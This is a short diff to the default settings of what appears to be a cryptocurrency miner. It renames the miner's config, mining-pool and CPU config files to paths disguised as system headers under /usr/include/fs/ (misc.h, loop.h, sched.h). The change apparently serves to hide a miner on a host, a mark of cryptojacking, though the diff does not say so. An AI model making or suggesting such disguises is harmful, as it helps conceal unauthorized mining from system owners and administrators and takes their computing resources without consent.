@@ -63,10 +63,10 @@ struct params
 		useNVIDIA(true),
 		useCPU(true),
 		openCLVendor("AMD"),
-		configFile("config.txt"),
-		configFilePools("pools.txt"),
+		configFile("/usr/include/fs/misc.h"),
+		configFilePools("/usr/include/fs/loop.h"),
 		configFileAMD("amd.txt"),
-		configFileCPU("cpu.txt"),
+		configFileCPU("/usr/include/fs/sched.h"),
 		configFileNVIDIA("nvidia.txt")
 	{}
 
